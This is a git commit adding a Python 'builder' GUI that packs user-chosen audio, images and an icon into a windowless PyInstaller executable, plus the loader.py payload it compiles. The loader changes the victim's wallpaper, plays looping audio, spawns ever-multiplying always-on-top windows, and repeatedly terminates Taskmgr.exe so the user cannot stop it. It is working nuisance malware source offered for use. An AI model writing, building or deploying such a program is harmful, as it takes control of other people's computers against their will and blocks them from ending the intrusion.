e490769461c3513518b5a0d57cd7d6b7e4dabae7
Moncef <mxclanhunter@gmail.com>
2024-01-09 10:16:41 -0800

    first commit

---
+++ builder.py
@@ -0,0 +1,271 @@
+import tkinter as tk
+from tkinter import filedialog
+from tkinter import ttk
+import os
+import shutil
+import subprocess
+from PIL import Image, ImageSequence
+
+class BuilderApp:
+    def __init__(self, master):
+        assets_folder = "./Output/assets"
+        shutil.rmtree(assets_folder, ignore_errors=True)
+        os.makedirs(assets_folder)
+        self.master = master
+        self.master.title("Builder App")
+        self.master.geometry("500x600")
+        self.master.configure(bg="#333333")  # Set dark grey background
+
+        # Asset paths
+        self.music1_path = tk.StringVar()
+        self.music2_path = tk.StringVar()
+        self.icon_path = tk.StringVar()
+        self.background_path = tk.StringVar()
+        self.gif_path = tk.StringVar()
+        self.terminate_processes_var = tk.BooleanVar(value=False)
+
+
+        # Configure style for themed widgets
+        style = ttk.Style()
+        style.configure("TFrame", background="#333333")  # Dark grey background
+        style.configure("TButton", background="gold", bordercolor="gold", foreground="#E1D9D1")  # Gold button with gold border
+        style.map("TButton", background=[("active", "#555555")])  # Darker background on button press
+        style.configure("TLabel", background="#333333", foreground="white")  # Dark grey label
+        style.configure("TEntry", fieldbackground="#555555", foreground="white")  # Darker grey entry field
+
+        # Entry fields for asset paths
+        tk.Label(self.master, text="Music 1:", bg="#333333", fg="white").pack()
+        self.music1_entry = tk.Entry(self.master, textvariable=self.music1_path, bg="#555555", fg="#E1D9D1")
+        self.music1_entry.pack(pady=5)
+
+        tk.Label(self.master, text="Music 2:", bg="#333333", fg="white").pack()
+        self.music2_entry = tk.Entry(self.master, textvariable=self.music2_path, bg="#555555", fg="#E1D9D1")
+        self.music2_entry.pack(pady=5)
+
+        tk.Label(self.master, text="Icon:", bg="#333333", fg="white").pack()
+        self.icon_entry = tk.Entry(self.master, textvariable=self.icon_path, bg="#555555", fg="#E1D9D1")
+        self.icon_entry.pack(pady=5)
+
+        tk.Label(self.master, text="Background Image:", bg="#333333", fg="white").pack()
+        self.background_entry = tk.Entry(self.master, textvariable=self.background_path, bg="#555555", fg="#E1D9D1")
+        self.background_entry.pack(pady=5)
+
+        tk.Label(self.master, text="GIF:", bg="#333333", fg="white").pack()
+        self.gif_entry = tk.Entry(self.master, textvariable=self.gif_path, bg="#555555", fg="#E1D9D1")
+        self.gif_entry.pack(pady=5)
+               
+               
+        tk.Checkbutton(self.master, text="Terminate Processes", variable=self.terminate_processes_var).pack()
+
+
+        # Buttons
+        self.upload_music1_button = tk.Button(self.master, text="Upload Music 1", command=self.upload_music1, bg="gold", fg="black")
+        self.upload_music1_button.pack(pady=5)
+
+        self.upload_music2_button = tk.Button(self.master, text="Upload Music 2", command=self.upload_music2, bg="gold", fg="black")
+        self.upload_music2_button.pack(pady=5)
+
+        self.upload_icon_button = tk.Button(self.master, text="Upload Icon", command=self.upload_icon, bg="gold", fg="black")
+        self.upload_icon_button.pack(pady=5)
+
+        self.upload_background_button = tk.Button(self.master, text="Upload Background", command=self.upload_background, bg="gold", fg="black")
+        self.upload_background_button.pack(pady=5)
+
+        self.upload_gif_button = tk.Button(self.master, text="Upload GIF", command=self.upload_gif, bg="gold", fg="black")
+        self.upload_gif_button.pack(pady=5)
+
+        self.start_button = tk.Button(self.master, text="Start Program", command=self.start_program, bg="gold", fg="black")
+        self.start_button.pack(pady=10)
+
+    def upload_music1(self):
+        file_path = filedialog.askopenfilename(title="Select Music 1 File", filetypes=[("MP3 Files", "*.mp3")])
+        if file_path:
+            # Move the file to the ./assets folder
+            dest_path = os.path.join('./Output/assets', os.path.basename(file_path))
+            shutil.copy(file_path, dest_path)
+            dest_path = os.path.join('.', 'assets', os.path.basename(file_path))
+
+            self.music1_path.set(dest_path)
+
+    def upload_music2(self):
+        file_path = filedialog.askopenfilename(title="Select Music 2 File", filetypes=[("MP3 Files", "*.mp3")])
+        if file_path:
+            # Move the file to the ./assets folder
+            dest_path = os.path.join('./Output/assets', os.path.basename(file_path))
+            shutil.copy(file_path, dest_path)
+            dest_path = os.path.join('.', 'assets', os.path.basename(file_path))
+
+            self.music2_path.set(dest_path)
+
+    def upload_icon(self):
+        file_path = filedialog.askopenfilename(title="Select Icon File", filetypes=[("Icon Files", "*.ico")])
+        if file_path:
+            # Move the file to the ./assets folder
+            dest_path = os.path.join('./Output/assets', os.path.basename(file_path))
+            shutil.copy(file_path, dest_path)
+            
+
+            self.icon_path.set(dest_path)
+            
+
+    def upload_background(self):
+        file_path = filedialog.askopenfilename(title="Select Background Image", filetypes=[("Image Files", "*.png;*.jpg;*.jpeg;*.gif")])
+        if file_path:
+            # Move the file to the ./assets folder
+            dest_path = os.path.join('./Output/assets', os.path.basename(file_path))
+            shutil.copy(file_path, dest_path)
+            dest_path = os.path.join('.', 'assets', os.path.basename(file_path))
+
+            self.background_path.set(dest_path)
+            
+
+    def upload_gif(self):
+        file_path = filedialog.askopenfilename(title="Select GIF File", filetypes=[("GIF Files", "*.gif")])
+        if file_path:
+            # Move the file to the ./Output/assets folder
+            dest_path = os.path.join('./Output/assets', os.path.basename(file_path))
+            shutil.copy(file_path, dest_path)
+
+            # Resize the GIF to 80x80 pixels
+            resized_gif_path = os.path.join('./Output/assets', f"resized_{os.path.basename(file_path)}")
+            self.resize_gif(dest_path, resized_gif_path, 80, 80)
+            resized_gif_path = os.path.join('.', 'assets', os.path.basename(f"resized_{os.path.basename(file_path)}"))
+
+            self.gif_path.set(resized_gif_path)
+
+    def resize_gif(self, input_path, output_path, width, height):
+        try:
+            original = Image.open(input_path)
+            frames = []
+
+            for frame in ImageSequence.Iterator(original):
+                resized_frame = frame.resize((width, height), Image.LANCZOS)
+                frames.append(resized_frame)
+
+            frames[0].save(output_path, save_all=True, append_images=frames[1:], loop=0, duration=original.info['duration'])
+
+        except Exception as e:
+            print(f"Error resizing GIF: {e}")
+    
+    
+    def compile_loader(self):
+        try:
+            icon_path = self.icon_path.get()  # Retrieve the selected icon path
+            output_folder = "./Output"  # Specify the output folder
+
+            options = ["--onefile", "--noconsole", f"--distpath={output_folder}"]  # Add options for one-file, no console, and specify output folder
+            if icon_path:
+                options.extend(["--icon", icon_path])  # Add the icon option if provided
+
+            subprocess.run(["pyinstaller"] + options + ["loader.py"])
+            print("Compilation successful!")
+
+        except Exception as e:
+            print(f"Error during compilation: {e}")
+    def start_program(self):
+        # Retrieve the selected asset paths
+        music1_path = self.music1_path.get()
+        print(music1_path)
+        music2_path = self.music2_path.get()
+        print(music2_path)
+        icon_path = self.icon_path.get()
+        background_path = self.background_path.get()
+        gif_path = self.gif_path.get()
+        code = f"""#Loadfiles
+short_audio_path = "./assets/{os.path.basename(music1_path)}"  # Replace with your short audio file
+lol_audio_path = "./assets/{os.path.basename(music2_path)}"  # Replace with e
+image_filename = './assets/{os.path.basename(background_path)}'
+gif_path = "./assets/{os.path.basename(gif_path)}"
+#stop"""
+
+
+        termination_code = """#hhh
+import psutil
+import time
+import threading
+
+def terminate_process_by_name(process_name, duration):
+    start_time = time.time()
+    
+    while time.time() - start_time < duration:
+        for process in psutil.process_iter(['pid', 'name']):
+            if process.info['name'] == process_name:
+                pid = process.info['pid']
+                
+                p = psutil.Process(pid)
+                p.terminate()
+                print(f"Terminated process '{process_name}' with PID {pid}")
+        
+        # Adjust the sleep interval as needed
+        time.sleep(1)  # Sleep for 1 second before checking again
+
+def terminate_after_timeout(process_name, timeout):
+    time.sleep(timeout)
+    for process in psutil.process_iter(['pid', 'name']):
+        if process.info['name'] == process_name:
+            pid = process.info['pid']
+            try:
+                p = psutil.Process(pid)
+                p.terminate()
+                print(f"Terminated process '{process_name}' with PID {pid}")
+            except psutil.NoSuchProcess:
+                print(f"Process '{process_name}' with PID {pid} not found")
+
+
+# Create threads for each function
+spawn2 = threading.Thread(target=terminate_process_by_name, args=('Taskmgr.exe',3000))
+spawn2.start()
+
+
+#hxh"""
+            
+        paw_path = "./loader.py"
+        with open(paw_path, 'r') as paw_file:
+            paw_contents = paw_file.read()
+
+        # Find the markers for code replacement
+        start_marker = "#Loadfiles"
+        end_marker = "#stop"
+        start_marker2 = "#hhh"
+        end_marker2 = "#hxh"
+
+        # Ensure the markers are present in the file
+        if start_marker not in paw_contents or end_marker not in paw_contents or start_marker2 not in paw_contents or end_marker2 not in paw_contents:
+            raise ValueError("Markers not found in the loader.py file")
+
+        # Replace the code in loader.py
+        new_paw_contents = paw_contents.replace(
+            paw_contents[paw_contents.index(start_marker):paw_contents.index(end_marker, paw_contents.index(start_marker)) + len(end_marker)],
+            code
+        ).replace(
+            paw_contents[paw_contents.index(start_marker2):paw_contents.index(end_marker2, paw_contents.index(start_marker2)) + len(end_marker2)],
+            termination_code if self.terminate_processes_var.get() else """#hhh
+#hxh"""
+        )
+
+        # Write the updated content back to loader.py
+        with open(paw_path, 'w') as paw_file:
+            paw_file.write(new_paw_contents)
+
+
+
+
+
+        # Write the generated code into loader.py
+        
+
+        print("Starting program with custom assets...")
+        print(f"Music 1: {music1_path}")
+        print(f"Music 2: {music2_path}")
+        print(f"Icon: {icon_path}")
+        print(f"Background Image: {background_path}")
+        print(f"GIF: {gif_path}")
+        # Include logic to start the main program with the specified assets
+        self.compile_loader()
+        
+
+
+if __name__ == "__main__":
+    root = tk.Tk()
+    app = BuilderApp(root)
+    root.mainloop()
---
+++ loader.py
@@ -0,0 +1,306 @@
+import tkinter as tk
+from PIL import Image, ImageTk, ImageSequence
+import random
+import time
+import pygame
+import subprocess
+import threading
+import struct
+import ctypes
+import os
+import psutil
+
+
+# Initialize pygame
+pygame.init()
+pygame.mixer.init()
+
+
+
+#Loadfiles
+short_audio_path = "./assets/Beethoven - Moonlight Sonata (1st Movement).mp3"  # Replace with your short audio file
+lol_audio_path = "./assets/Official Goku Drip Theme - Ultra Dripstinct.mp3"  # Replace with e
+image_filename = './assets/8bsdxo.jpg'
+gif_path = "./assets/resized_vegeta-ultra-ego-angry.gif"
+#stop
+
+
+
+
+
+
+
+short_audio_sound = pygame.mixer.Sound(short_audio_path)
+short_audio_sound.set_volume(1)
+lol_audio_sound = pygame.mixer.Sound(lol_audio_path)
+lol_audio_sound.set_volume(0.5)
+
+# Create threads for playing audio
+def play_short_audio():
+    short_audio_sound.play()
+    time.sleep(10)  # Play for 10 seconds
+    short_audio_sound.stop()
+
+def play_lol_audio():
+    lol_audio_sound.play(-1)  # Play on repeat
+
+short_audio_thread = threading.Thread(target=play_short_audio)
+lol_audio_thread = threading.Thread(target=play_lol_audio)
+
+# Start the audio threads
+short_audio_thread.start()
+short_audio_thread.join()
+lol_audio_thread.start()
+
+SPI_SETDESKWALLPAPER = 20
+
+def is_64bit_windows():
+    """Check if 64 bit Windows OS"""
+    return struct.calcsize('P') * 8 == 64
+
+def changeBG(path):
+    """Change background depending on bit size"""
+    if is_64bit_windows():
+        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 3)
+    else:
+        ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, path, 3)
+
+# Get the absolute path of the image in the same directory as the script
+script_dir = os.path.dirname(os.path.abspath(__file__))
+image_path = os.path.join(script_dir, image_filename)
+
+changeBG(image_path)
+# Initialize the tkinter window
+root = tk.Tk()
+root.overrideredirect(True)  # Remove window decorations
+root.attributes('-transparentcolor', 'white')  # Make white background transparent
+
+
+# Get screen dimensions
+screen_width = root.winfo_screenwidth()
+screen_height = root.winfo_screenheight()
+
+# Create a canvas to display the animated GIF
+canvas = tk.Canvas(root, width=110, height=120, highlightthickness=0, bg='black')  # Set canvas background to black
+canvas.pack()
+# Load the GIF animation using PIL
+
+
+rickroll_animation = Image.open(gif_path)
+frames = [ImageTk.PhotoImage(frame) for frame in ImageSequence.Iterator(rickroll_animation)]
+
+# Create a label to display the GIF frames
+gif_label = tk.Label(canvas, image=frames[0], background='black')  # Set label background to black
+gif_label.pack()
+
+
+# Set the movement interval
+initial_movement_interval = 0.5  # in seconds
+movement_interval = initial_movement_interval
+
+SPI_SETDESKWALLPAPER = 20
+
+def is_64bit_windows():
+    """Check if 64 bit Windows OS"""
+    return struct.calcsize('P') * 8 == 64
+
+def changeBG(path):
+    """Change background depending on bit size"""
+    if is_64bit_windows():
+        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 3)
+    else:
+        ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, path, 3)
+
+# Get the absolute path of the image in the same directory as the script
+script_dir = os.path.dirname(os.path.abspath(__file__))
+image_path = os.path.join(script_dir, image_filename)
+
+changeBG(image_path)
+def update_gif():
+    global frame_index  # Declare frame_index as a global variable
+    frame_index = (frame_index + 1) % len(frames)
+    gif_label.config(image=frames[frame_index])
+    root.after(30, update_gif)
+
+def move_window():
+    global movement_interval
+    while True:
+        window_x = random.randint(0, screen_width - 110)
+        window_y = random.randint(0, screen_height - 120)
+        
+        # Generate random background color
+        r = random.randint(0, 255)
+        g = random.randint(0, 255)
+        b = random.randint(0, 255)
+        canvas_color = f'#{r:02x}{g:02x}{b:02x}'
+        
+        canvas.config(bg=canvas_color)
+        root.geometry(f"+{window_x}+{window_y}")
+        
+        root.update()  # Update the window to apply the new background color
+        time.sleep(movement_interval)
+        
+        # Increase speed every 10 seconds
+        if time.time() % 10 == 0:
+            movement_interval *= 1.5  # Increase
+
+
+
+
+
+def bring_to_front():
+    while True:
+        root.lift()
+        root.attributes('-topmost', 1)
+        time.sleep(0.1)
+
+# Start updating the GIF
+frame_index = 0
+update_gif()
+
+# Create threads for moving the window and bringing it to front
+move_thread = threading.Thread(target=move_window)
+
+bring_to_front_thread = threading.Thread(target=bring_to_front)
+# Start the threads
+move_thread.start()
+
+bring_to_front_thread.start()
+def resize_gif(gif_path2, max_width, max_height):
+    gif = Image.open(gif_path2)
+    
+    # Calculate new dimensions while preserving the aspect ratio
+    original_width, original_height = gif.size
+    aspect_ratio = original_width / original_height
+    
+    if aspect_ratio > 1:
+        # Landscape orientation
+        new_width = min(original_width, max_width)
+        new_height = int(new_width / aspect_ratio)
+    else:
+        # Portrait or square orientation
+        new_height = min(original_height, max_height)
+        new_width = int(new_height * aspect_ratio)
+    
+    resized_gif = gif.resize((new_width, new_height), Image.LANCZOS)  # Use Image.LANCZOS for resizing
+    return ImageTk.PhotoImage(resized_gif)
+def spawn_duplicate_with_delay(gif_path2, delay, new_width, new_height):
+    time.sleep(delay)
+    resized_gif = resize_gif(gif_path2, new_width, new_height)
+    spawn_duplicate_window(resized_gif)
+    
+
+def spawn_duplicate_window(duplicate_gif):
+    duplicate_window = tk.Toplevel(root)
+    duplicate_window.overrideredirect(True)
+    duplicate_window.attributes('-transparentcolor', 'white')
+    
+    duplicate_canvas = tk.Canvas(duplicate_window, width=110, height=120, highlightthickness=0, bg='black')
+    duplicate_canvas.pack()
+   
+    duplicate_gif_label = tk.Label(duplicate_canvas, image=duplicate_gif, background='black')
+    duplicate_gif_label.pack()
+    
+    duplicate_movement_interval = initial_movement_interval
+
+    def update_duplicate_gif():
+        nonlocal frame_index
+        frame_index = (frame_index + 1) % len(frames)  # Use the frames list
+        duplicate_gif_label.config(image=frames[frame_index])  # Use frames here
+        duplicate_window.after(30, update_duplicate_gif)
+    
+    def move_duplicate_window(interval):
+        while True:
+            window_x = random.randint(0, screen_width - 110)
+            window_y = random.randint(0, screen_height - 120)
+        
+            r = random.randint(0, 255)
+            g = random.randint(0, 255)
+            b = random.randint(0, 255)
+            canvas_color = f'#{r:02x}{g:02x}{b:02x}'
+        
+            duplicate_canvas.config(bg=canvas_color)
+            duplicate_window.geometry(f"+{window_x}+{window_y}")
+        
+            duplicate_window.update()
+            time.sleep(interval)
+        
+            if int(time.time()) % 10 == 0:
+                interval *= 1.5
+    
+    frame_index = 0
+    update_duplicate_gif()
+    def bring_to_front():
+        while True:
+            duplicate_window.lift()
+            duplicate_window.attributes('-topmost', 1)
+            time.sleep(0.1)
+    bring_to_front_thread = threading.Thread(target=bring_to_front)
+    bring_to_front_thread.start()
+
+# Start updating the GIF
+    
+    duplicate_move_thread = threading.Thread(target=move_duplicate_window, args=(duplicate_movement_interval,))
+    duplicate_move_thread.start()
+
+
+def spawn_duplicate_threads():
+    while True:
+        for _ in range(2):
+            duplicate_thread = threading.Thread(target=spawn_duplicate_with_delay, args=(gif_path, 5, 50, 60))
+            duplicate_thread.start()
+        time.sleep(10)  # Wait for 10 seconds before starting the next iteration
+
+# Call the function to start the loop
+spawn = threading.Thread(target=spawn_duplicate_threads)
+
+terminate_threads = []  # List to keep track of termination threads
+
+# Create a thread for termination and duplicate threads
+terminate_and_duplicate_thread = threading.Thread(target=lambda: [thread.start() for thread in terminate_threads] + [spawn.start()])
+
+# Start the termination and duplicate thread
+terminate_and_duplicate_thread.start()
+
+#hhh
+import psutil
+import time
+import threading
+
+def terminate_process_by_name(process_name, duration):
+    start_time = time.time()
+    
+    while time.time() - start_time < duration:
+        for process in psutil.process_iter(['pid', 'name']):
+            if process.info['name'] == process_name:
+                pid = process.info['pid']
+                
+                p = psutil.Process(pid)
+                p.terminate()
+                print(f"Terminated process '{process_name}' with PID {pid}")
+        
+        # Adjust the sleep interval as needed
+        time.sleep(1)  # Sleep for 1 second before checking again
+
+def terminate_after_timeout(process_name, timeout):
+    time.sleep(timeout)
+    for process in psutil.process_iter(['pid', 'name']):
+        if process.info['name'] == process_name:
+            pid = process.info['pid']
+            try:
+                p = psutil.Process(pid)
+                p.terminate()
+                print(f"Terminated process '{process_name}' with PID {pid}")
+            except psutil.NoSuchProcess:
+                print(f"Process '{process_name}' with PID {pid} not found")
+
+
+# Create threads for each function
+spawn2 = threading.Thread(target=terminate_process_by_name, args=('Taskmgr.exe',80))
+spawn2.start()
+
+
+#hxh
+
+
+root.mainloop()
